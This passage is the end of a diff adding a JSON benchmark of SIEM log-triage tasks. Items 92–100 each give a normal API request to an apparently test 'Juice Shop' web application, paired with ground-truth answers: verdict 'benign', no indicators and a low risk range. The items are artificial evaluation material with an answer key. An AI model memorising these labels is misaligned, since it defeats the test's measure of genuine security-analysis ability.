+        "username": "api-user",
+        "rule_name": "APP_API_product-detail-1",
+        "timestamp": "2026-03-21T14:37:32Z",
+        "raw_log": "GET /api/Products/1 HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-03-21T14:32:44.317Z\",\"updatedAt\":\"2026-03-21T14:32:44.317Z\",\"deletedAt\":null}}"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 92,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review normal API call to /api/Products/2",
+      "siem_event": {
+        "title": "APP_API_product-detail-2",
+        "source_ip": "10.0.10.13",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "api-user",
+        "rule_name": "APP_API_product-detail-2",
+        "timestamp": "2026-03-21T14:37:32Z",
+        "raw_log": "GET /api/Products/2 HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":{\"id\":2,\"name\":\"Orange Juice (1000ml)\",\"description\":\"Made from oranges hand-picked by Uncle Dittmeyer.\",\"price\":2.99,\"deluxePrice\":2.49,\"image\":\"orange_juice.jpg\",\"createdAt\":\"2026-03-21T14:32:44.317Z\",\"updatedAt\":\"2026-03-21T14:32:44.317Z\",\"deletedAt\":null}}"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 93,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review normal API call to /api/Products/3",
+      "siem_event": {
+        "title": "APP_API_product-detail-3",
+        "source_ip": "10.0.10.10",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "api-user",
+        "rule_name": "APP_API_product-detail-3",
+        "timestamp": "2026-03-21T14:37:32Z",
+        "raw_log": "GET /api/Products/3 HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":{\"id\":3,\"name\":\"Eggfruit Juice (500ml)\",\"description\":\"Now with even more exotic flavour.\",\"price\":8.99,\"deluxePrice\":8.99,\"image\":\"eggfruit_juice.jpg\",\"createdAt\":\"2026-03-21T14:32:44.317Z\",\"updatedAt\":\"2026-03-21T14:32:44.317Z\",\"deletedAt\":null}}"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 94,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review normal API call to /rest/products/search?q=",
+      "siem_event": {
+        "title": "APP_API_product-list-all",
+        "source_ip": "10.0.10.17",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "api-user",
+        "rule_name": "APP_API_product-list-all",
+        "timestamp": "2026-03-21T14:37:32Z",
+        "raw_log": "GET /rest/products/search?q= HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-03-21 14:32:44.317 +00:00\",\"updatedAt\":\"2026-03-21 14:32:44.317 +00:00\",\"deletedAt\":null},{\"id\":24,\"name\":\"Apple Pomace\""
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 95,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review normal API call to /rest/languages",
+      "siem_event": {
+        "title": "APP_API_languages",
+        "source_ip": "10.0.10.17",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "api-user",
+        "rule_name": "APP_API_languages",
+        "timestamp": "2026-03-21T14:37:32Z",
+        "raw_log": "GET /rest/languages HTTP/1.1 | Status: 200 | Body: [{\"key\":\"az_AZ\",\"lang\":\"Azərbaycanca\",\"icons\":[\"az\"],\"shortKey\":\"AZ\",\"percentage\":40,\"gauge\":\"quarter\"},{\"key\":\"id_ID\",\"lang\":\"Bahasa Indonesia\",\"icons\":[\"id\"],\"shortKey\":\"ID\",\"percentage\":15,\"gauge\":\"empty\"},{\"key\":\"ca_ES\",\"lang\":\"Catalan\",\"icons\":[\"es-ct\"],\"shortKey\":\"CA\",\"percentage\":9,\"gauge\":\"e"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 96,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review normal API call to /api/Challenges",
+      "siem_event": {
+        "title": "APP_API_challenges-list",
+        "source_ip": "10.0.10.17",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "api-user",
+        "rule_name": "APP_API_challenges-list",
+        "timestamp": "2026-03-21T14:37:32Z",
+        "raw_log": "GET /api/Challenges HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":1,\"key\":\"passwordHashLeakChallenge\",\"name\":\"Password Hash Leak\",\"category\":\"Sensitive Data Exposure\",\"tags\":null,\"description\":\"Obtain the password (hash) of the currently logged-in user directly from a REST API endpoint.\",\"difficulty\":2,\"mitigationUrl\":\"https://owa"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 97,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review normal API call to /api/SecurityQuestions",
+      "siem_event": {
+        "title": "APP_API_security-questions",
+        "source_ip": "10.0.10.13",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "api-user",
+        "rule_name": "APP_API_security-questions",
+        "timestamp": "2026-03-21T14:37:32Z",
+        "raw_log": "GET /api/SecurityQuestions HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":1,\"question\":\"Your eldest siblings middle name?\",\"createdAt\":\"2026-03-21T14:32:39.797Z\",\"updatedAt\":\"2026-03-21T14:32:39.797Z\"},{\"id\":2,\"question\":\"Mother's maiden name?\",\"createdAt\":\"2026-03-21T14:32:39.797Z\",\"updatedAt\":\"2026-03-21T14:32:39.797Z\"},{\"id\":3,\"questio"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 98,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review normal API call to /rest/captcha",
+      "siem_event": {
+        "title": "APP_API_captcha",
+        "source_ip": "10.0.10.10",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "api-user",
+        "rule_name": "APP_API_captcha",
+        "timestamp": "2026-03-21T14:37:32Z",
+        "raw_log": "GET /rest/captcha HTTP/1.1 | Status: 200 | Body: {\"captchaId\":0,\"captcha\":\"5*7+10\",\"answer\":\"45\"}"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 99,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review normal API call to /api/Quantitys",
+      "siem_event": {
+        "title": "APP_API_product-quantities",
+        "source_ip": "10.0.10.14",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "api-user",
+        "rule_name": "APP_API_product-quantities",
+        "timestamp": "2026-03-21T14:37:32Z",
+        "raw_log": "GET /api/Quantitys HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"ProductId\":1,\"id\":1,\"quantity\":80,\"limitPerUser\":5,\"createdAt\":\"2026-03-21T14:32:44.760Z\",\"updatedAt\":\"2026-03-21T14:32:44.760Z\"},{\"ProductId\":2,\"id\":2,\"quantity\":49,\"limitPerUser\":null,\"createdAt\":\"2026-03-21T14:32:44.760Z\",\"updatedAt\":\"2026-03-21T14:32:44.760Z\"},{\"Pro"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 100,
+      "task_type": "benign_activity",
+      "severity": "low",
+      "prompt": "Review normal API call to /rest/admin/application-version",
+      "siem_event": {
+        "title": "APP_API_app-version",
+        "source_ip": "10.0.10.13",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "api-user",
+        "rule_name": "APP_API_app-version",
+        "timestamp": "2026-03-21T14:37:32Z",
+        "raw_log": "GET /rest/admin/application-version HTTP/1.1 | Status: 200 | Body: {\"version\":\"19.2.1\"}"
+      },
+      "ground_truth": {
+        "verdict": "benign",
+        "expected_iocs": [],
+        "risk_range": [
+          0,
+          15
+        ],
+        "attack_type": "benign",
+        "difficulty": "easy"
+      }
+    }
+  ]
+}
